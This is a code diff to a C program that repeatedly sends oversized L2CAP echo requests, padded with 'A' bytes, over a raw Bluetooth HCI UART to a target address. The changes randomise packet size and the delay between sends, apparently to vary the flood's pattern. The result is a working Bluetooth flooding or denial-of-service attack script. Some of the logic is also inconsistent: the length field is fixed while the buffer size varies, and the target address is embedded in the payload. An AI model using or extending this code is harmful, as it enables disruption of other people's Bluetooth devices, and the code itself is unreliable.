@@ -5,6 +5,7 @@
 #include <fcntl.h>
 #include <termios.h>
 #include <signal.h>
+#include <time.h>
 
 #define BT_UART "/dev/ttyHSL0" // Bluetooth UART device
 #define UNUSED(x) (void)(x)
@@ -63,8 +64,17 @@ int is_valid_bt_addr(const char *addr) {
 
 
 void send_l2cap_echo_request(int fd) {
-    uint8_t hci_packet[608];
-    memset(hci_packet, 0, sizeof(hci_packet));    
+    srand(time(NULL));
+
+    size_t random_size = (rand() % (600 - 590 + 1)) + 590;
+    uint8_t hci_packet[random_size + 8];
+    memset(hci_packet, 0, sizeof(hci_packet));
+
+    // Extract the target Bluetooth address (6 bytes)
+    uint8_t bt_addr[6];
+    sscanf(target_addr, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
+           &bt_addr[0], &bt_addr[1], &bt_addr[2], 
+           &bt_addr[3], &bt_addr[4], &bt_addr[5]);
 
     // HCI ACL Data Header (4 bytes)
     hci_packet[0] = 0x02;  // HCI Packet Type: ACL Data
@@ -84,7 +94,11 @@ void send_l2cap_echo_request(int fd) {
     hci_packet[10] = 0xF6; // Length = 600 bytes (0xF6 0x02)
     hci_packet[11] = 0x02;
     
-    memset(&hci_packet[12], 'A', sizeof(hci_packet) - 12);
+    // Include the Bluetooth address (6 bytes) in the packet
+    // Assuming you want to embed it in the packet's payload (adjust where needed)
+    memcpy(&hci_packet[12], bt_addr, 6);  // Embed BT address in packet (adjust the offset)
+
+    memset(&hci_packet[18], 'A', sizeof(hci_packet) - 18);  // Fill the rest of the packet
 
     ssize_t result = write(fd, hci_packet, sizeof(hci_packet));
     if (result < 0) {
@@ -96,6 +110,7 @@ void send_l2cap_echo_request(int fd) {
 
     printf("Echo Request sent to %s!\n", target_addr);    
 }
+
 
 void receive_l2cap_echo_response(int fd) {
     uint8_t buffer[1024];
@@ -129,10 +144,13 @@ int main(int argc, char *argv[]) {
     signal(SIGINT, signal_handler);
     fd = open_uart();
 
-    while (1) {                
+    while (1) {
+        srand(time(NULL));    
+        int sleep_time = (rand() % (90 - 70 + 1)) + 70;
+
         send_l2cap_echo_request(fd);        
         receive_l2cap_echo_response(fd);
-        usleep(90000);
+        usleep(sleep_time * 1000);
     }
 
     close(fd);
